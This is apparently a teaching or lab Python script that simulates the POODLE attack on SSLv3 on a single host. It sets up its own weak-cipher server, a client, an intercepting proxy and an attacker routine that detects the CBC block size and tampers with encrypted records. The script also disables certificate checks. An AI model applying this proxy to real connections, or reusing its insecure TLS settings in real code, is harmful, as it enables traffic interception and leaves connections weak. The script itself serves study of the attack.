#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import random
import select
import socket
import SocketServer
import ssl
import string
import sys
import struct
import threading
import re
import binascii
import math
from pprint import pprint
from pyfancy import *
from struct import *

class SecureTCPHandler(SocketServer.BaseRequestHandler):
  def handle(self):
    self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_SSLv3, ciphers="SHA1+DES")

    #loop to avoid broken pipe
    while True:
        try:
            data = self.request.recv(1024)
            if data == '':
                break

            print(pyfancy.LIGHTGREEN + 'The paquet is securely received: {}'.format(repr(data)) + pyfancy.END)
            self.request.send(b'OK')
        except ssl.SSLError as e:
            pass
    return

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        httpd = SocketServer.TCPServer((self.host, self.port), SecureTCPHandler)
        server = threading.Thread(target=httpd.serve_forever)
        server.daemon=True
        server.start()
        print('Server is serving HTTPS on {!r} port {}'.format(self.host, self.port))
        self.httpd = httpd
        return

    def get_host(self):
        return self.host

    def get_port(self):
        return self.port

    def disconnect(self):
        print('Server stop serving HTTPS on {!r} port {}'.format(self.host, self.port))
        self.httpd.shutdown()
        return

class Client:

    def __init__(self, host, port):
        self.proxy_host = host
        self.proxy_port = port
        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))

    def connection(self):
        print pyfancy.PINK + "Client " + pyfancy.END + " --> " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END
        print('Client connected to the proxy\n')
        print('Client do handshake with the server')

        # Initialization of the client
        # purpose = ssl.Purpose.SERVER_AUTH
        # context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
        # raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # ssl_sock = context.wrap_socket(raw_sock, server_hostname=self.proxy_host)
        ssl_sock = socket.create_connection((self.proxy_host, self.proxy_port))
        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3, cert_reqs=ssl.CERT_NONE, ciphers="SHA1+DES")

        # Connexion to the proxy
        #ssl_sock.connect((self.proxy_host, self.proxy_port))
        self.socket = ssl_sock
        return
    
    def request_cookie(self, path=0, data=0):
        print('Cliend send request with a cookie...')
        srt_path = ''
        srt_data = ''
        for x in range(0,path):
            srt_path += 'A'
        for x in range(0,data):
            srt_data += 'D'
        try:        
            self.socket.sendall(b"GET /"+ srt_path +" HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n" + srt_data)
            msg = "".join([str(i) for i in self.socket.recv(1024).split(b"\r\n")])
            print("[" + pyfancy.GREEN + msg + pyfancy.END + "] Client received confirmation from the server")
        except ssl.SSLError as e:
            pass
        pass
        return

    def disconnect(self):
        print("Client disconnect")
        self.socket.close()
        return

class ProxyTCPHandler(SocketServer.BaseRequestHandler):

    def handle(self):

        # Connection to the secure server
        socket_server = socket.create_connection((server.get_host(), server.get_port()))
        # input allow us to monitor the socket of the client and the server
        inputs = [socket_server, self.request]
        running = True
        data_altered = False
        while running:
            readable = select.select(inputs, [], [])[0]
            for source in readable:
                if source is socket_server:

                    print pyfancy.PINK + "Client " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END + " <----- " + pyfancy.BLUE +"Server" + pyfancy.END

                    data = socket_server.recv(1024)
                    if len(data) == 0:
                        running = False
                        break

                    (content_type, version, length) = struct.unpack('>bhh', data[0:5])

                    if data_altered is True:
                        #print "content type " + str(content_type)
                        if content_type == 23:
                            print "All fine, the request is not altered"
                        elif content_type == 21:
                            print "The request is altered MAC error"
                        data_altered = False
                    
                    # we send data to the client
                    self.request.send(data)

                elif source is self.request:
                    print pyfancy.PINK + "Client " + pyfancy.END + " --> " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END + " -----> " + pyfancy.BLUE + "Server" + pyfancy.END
                    
                    ssl_header = self.request.recv(5)
                    if ssl_header == '':
                        running = False
                        break

                    (content_type, version, length) = struct.unpack('>BHH', ssl_header )

                    data = self.request.recv(length)
                    if len(data) == 0:
                        running = False

                    if content_type == 23 and length > 24:
                        poodle.set_length_frame(data) 
                        data_altered = True
                        tmp_data = poodle.alter()
                        if tmp_data:
                            data = tmp_data               
                    
                    # we send data to the server
                    socket_server.send(ssl_header+data)
        return

class Proxy:

    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        httpd = SocketServer.TCPServer((self.host, self.port), ProxyTCPHandler)
        proxy = threading.Thread(target=httpd.serve_forever)
        proxy.daemon=True
        proxy.start()
        print('Proxy is launched on {!r} port {}'.format(self.host, self.port))
        self.proxy = httpd
        return

    def disconnect(self):
        print('Proxy is stopped on {!r} port {}'.format(self.host, self.port))
        self.proxy.shutdown()
        return

class Poodle(Client):

    def __init__(self, client):
        self.client = client
        self.length_block = 0
        self.start_exploit = False
        self.nb_prefix = 0

    def test_poodle_attack(self):
        self.client_connection()
        self.size_of_block()
        self.start_exploit = True
        self.send_request_from_the_client(self.nb_prefix)
        self.client_disconect()
        return

    def set_length_frame(self, data):
        self.frame = data
        self.length_frame = len(data)

    def size_of_block(self):
        self.send_request_from_the_client()
        reference_length = self.length_frame
        for i in range(1, 16):
            self.send_request_from_the_client(i)
            current_length = self.length_frame
            self.length_block = current_length - reference_length
            if self.length_block != 0:
                self.nb_prefix = i
                print "Succes block size " + str(self.length_block)
                print "number prefixe " + str(i)
                break

    def alter(self):
        if self.start_exploit is True:
            self.frame = bytearray(self.frame)
            self.frame = self.frame[:-self.length_block] + self.frame[24:32]
            #print binascii.hexlify(self.frame)
            return str(self.frame)
        return


    def client_connection(self):
        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
        self.client.connection()
        return

    def send_request_from_the_client(self, path=0, data=0):
        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
        self.client.request_cookie(path,data)
        return

    def client_disconect(self):
        print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
        self.client.disconnect()
        return

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='Connection with SSLv3')
    parser.add_argument('host', help='hostname or IP address')
    parser.add_argument('port', type=int, help='TCP port number')
    parser.add_argument('-v', help='debug mode', action="store_true")
    args = parser.parse_args()

    server  = Server(args.host, args.port)
    client  = Client(args.host, args.port+1)
    spy     = Proxy(args.host, args.port+1)
    poodle  = Poodle(client)

    server.connection()
    spy.connection()

    poodle.test_poodle_attack()

    spy.disconnect()
    server.disconnect()
    

